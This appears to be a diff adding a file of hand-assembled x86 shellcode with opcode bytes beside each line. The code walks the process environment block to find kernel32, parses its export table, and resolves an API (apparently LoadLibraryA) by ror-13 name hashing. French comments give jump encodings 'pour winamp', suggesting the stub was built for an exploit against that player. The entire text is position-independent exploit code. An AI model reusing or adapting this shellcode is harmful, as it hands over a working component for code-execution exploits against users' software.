@@ -1,0 +1,57 @@
+56		push esi
+33C0		xor eax,eax
+648B4030	mov eax,fs:[eax+0x30]
+8B400C		mov eax,dword ptr ds:[eax+C]
+8B701C		mov esi,dword ptr ds:[eax+1C]
+ad		lods dword ptr ds:[esi]
+8B4008		mov eax,dword ptr ds:[eax+8]	//fin de kernel32handle
+
+bee8e4c00e	mov esi, 0ec0e4e8h
+8b583c		mov ebx, dword ptr [eax+3c]
+8b5c1878	mov ebx, dword ptr [eax+ebx+78]
+03d8		add ebx, eax
+8b4b18		mov ecx, dword ptr [ebx+18]
+8b5320		mov edx, dword ptr [ebx+20]
+03d0		add edx, eax
+
+[AAA]
+48		dec ecx
+85c9		test ecx, ecx
+//4octets	jz [DDD]	//7425 pour winamp
+c1e102		shl ecx, 2
+56		push esi
+8b3411		mov esi, dword [edx+ecx]
+03f0		add esi, eax
+c1e902		shr ecx, 2
+33ff		xor edi, edi	
+50		push eax	
+
+[BBB]
+33c0		xor eax, eax	//EP+61
+8a06		mov al, byte [esi]
+84c0		test al, al
+//4octets	jz [CCC]	//7408 pour winamp
+c1cf13		ror edi, 13
+03f8		add edi, eax
+46		inc esi
+//4octets	jmp [BBB]	//ebf0 pour winamp
+
+[CCC]
+58		pop eax
+5e		pop esi
+3bfe		cmp edi, esi
+//4octets	jnz [AAA]	//75d6 pour winamp
+
+[DDD]
+8b5324		mov edx, dword [ebx+24]
+03d0		add edx, eax
+d1e1		shl ecx, 1
+668b1411	mov dx, word [edx+ecx]
+33c9		xor ecx, ecx
+668bca		mov cx, dx
+8b531c		mov edx, dword [ebx+1c]
+03d0		add edx, eax
+c1e102		shl ecx, 2
+8b3411		mov esi, dword [edx+ecx]
+03f0		add esi, eax
+8bc6		mov eax, esi
